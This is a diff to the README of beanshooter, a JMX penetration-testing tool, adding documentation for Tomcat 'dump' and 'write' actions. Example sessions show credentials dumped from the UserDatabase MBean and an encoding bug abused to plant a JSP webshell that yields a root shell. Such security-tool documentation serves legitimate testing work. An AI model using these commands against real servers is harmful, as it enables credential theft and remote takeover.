@@ -95,7 +95,9 @@ autocompletion.
       + [read](#recorder-read)
       + [dump](#recorder-dump)
     - [tomcat](#tomcat)
+      + [dump](#tomcat-dump)
       + [list](#tomcat-list)
+      + [write](#tomcat-write)
     - [tonka](#tonka)
       + [exec](#tonka-exec)
       + [execarray](#tonka-execarray)
@@ -941,12 +943,37 @@ this saves the recording on the local machine instead on the application server.
 
 ---
 
-The `tomcat` operation interacts with the `MemoryUserDatabaseMBean` of *Apache tomcat*. This *MBean* provides access to user
-accounts that are available on a *tomcat* service.
+The `tomcat` operation interacts with the `MemoryUserDatabaseMBean` of *Apache Tomcat*. This *MBean* provides access to user
+accounts that are available on a *Tomcat* service.
+
+#### Tomcat Dump
+
+The `dump` action dumps usernames and passwords available on the *Tomcat* server into local files.
+When invoked with a single argument, credentials are dumped in `<username>:<password>` format:
+
+```console
+[qtc@devbox ~]$ beanshooter tomcat dump 172.17.0.2 1090 creds.txt
+[+] Dumping credentials...
+[+] Users dumped to /home/qtc/creds.txt
+[qtc@devbox ~]$ cat creds.txt
+manager:P@55w0rD#
+admin:s3cr3T!$
+status:cr@cKM3o.O
+```
+
+When invoked with two arguments, usernames are stored in the first specified location, passwords
+in the second one:
+
+```console
+[qtc@devbox ~]$ beanshooter tomcat dump 172.17.0.2 1090 users.txt passwords.txt
+[+] Dumping credentials...
+[+] Users dumped to /home/qtc/users.txt
+[+] Passwords dumped to /home/qtc/passwords.txt
+```
 
 #### Tomcat List
 
-The currently only implemented operation is `list`, which lists available user accounts, their associated roles and credentials:
+The `list` operation lists available user accounts, their associated roles and credentials:
 
 ```console
 [qtc@devbox ~]$ beanshooter tomcat list 172.17.0.2 1090
@@ -974,6 +1001,33 @@ The currently only implemented operation is `list`, which lists available user a
 [+] 	Roles:
 [+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
 ```
+
+#### Tomcat Write
+
+The `write` operation writes a partially controlled file to an arbitrary location on the application
+server. This action can be used to reliably deploy a webshell on a *Tomcat* service:
+
+```console
+[qtc@devbox ~]$ beanshooter tomcat write 172.17.0.2 1090 /opt/webshell-cli/webshells/webshell.jsp /usr/local/tomcat/webapps/ROOT/shell.jsp
+[+] Writing local file /opt/webshell-cli/webshells/webshell.jsp to server location /usr/local/tomcat/webapps/ROOT/shell.jsp
+[+] 	Current user database is at conf/tomcat-users.xml
+[+] 	Current user database is readonly
+[+] 	Adjusting readonly property to make it writable.
+[+] 	Changing database path to /usr/local/tomcat/webapps/ROOT/shell.jsp
+[+] 	Creating new role containing the local file content.
+[+] 	Saving modified user database.
+[+] 	Restoring readonly property.
+[+] 	Restoring pathname property.
+[+] All done.
+[qtc@devbox ~]$ webshell-cli http://172.17.0.2:8080/shell.jsp
+[root@d475fdb21692 /usr/local/tomcat]$ id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The `write` action abuses an encoding bug within the *UserDatabase MBean* of *Apache Tomcat*. We reported
+the bug, but it was not considered a security vulnerability. For writing to arbitrary locations, *beanshooter*
+needs to change the location of the *UserDatabase*. All changes are restored, after the desired file was written,
+but still be careful in production environments.
 
 
 ### Tonka
